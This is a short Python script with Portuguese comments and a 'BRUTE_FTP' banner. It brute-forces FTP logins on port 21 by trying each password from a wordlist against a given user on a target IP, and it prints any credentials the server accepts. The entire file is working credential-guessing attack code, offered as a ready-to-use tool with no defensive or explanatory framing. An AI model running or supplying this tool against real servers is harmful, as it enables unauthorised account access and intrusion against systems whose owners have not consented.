#!/usr/bin/python

# Bibliotecas
import socket,sys,re

# Constantes para facilitar a utilização das cores
class bcolors:
    GREEN = '\033[32;1m'
    BLUE = '\033[34;1m'
    YELLOW = '\033[33;1m'
    RED = '\033[31;1m'
    RED_BLINK = '\033[31;5;1m'
    END = '\033[m'

# Se a qtd de args for diferente de 4
if len(sys.argv) != 4:
    print (" ")
    print (bcolors.RED + "    ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━╸╺┳╸┏━┓  " + bcolors.END)
    print (bcolors.RED + "    ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┣╸  ┃ ┣━┛  " + bcolors.END)
    print (bcolors.RED + "    ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "╹   ╹ ╹  \n" + bcolors.END)
    print (bcolors.BLUE + " [!] How to use:" + bcolors.END)
    print (bcolors.GREEN + "     python3 " + sys.argv[0] + " 10.12.92.1 user passwords.txt" + bcolors.END)
    sys.exit()

# Salva os argumentos em variaveis
alvo = sys.argv[1]
usuario = sys.argv[2]

# Abre a lista do argumento de senhas
f = open(sys.argv[3])

# Exibe o banner e indica qual eh o alvo
print (" ")
print (bcolors.RED + "    ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━╸╺┳╸┏━┓  " + bcolors.END)
print (bcolors.RED + "    ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┣╸  ┃ ┣━┛  " + bcolors.END)    
print (bcolors.RED + "    ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "╹   ╹ ╹  \n" + bcolors.END)
print (bcolors.YELLOW + " [*] Target %s:%s\n"%(alvo,"21") + bcolors.END)

# Laco de repeticao para testar as senhas
for palavra in f.readlines():
    # Remove quebras de linha
    senha = palavra.strip()
    # Estabelece a conexao
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((alvo,21))
    s.recv(1024)
    # Envia as credenciais
    s.send(("USER "+str(usuario)+"\r\n").encode())
    s.recv(1024)
    s.send(("PASS "+str(senha)+"\r\n").encode())
    resposta = s.recv(1024)
    s.send(("QUIT\r\n").encode())

    # Analisa o retorno para retornar o sucesso ou fracasso
    if re.search(('230').encode(),resposta):
        print (bcolors.GREEN + " [+] Found" + bcolors.END + "  - User: %s | Password: %s"%(usuario,senha))
        sys.exit()
    else:
        print (bcolors.RED + " [!] Denied" + bcolors.END + " - User: %s | Password: %s"%(usuario,senha))
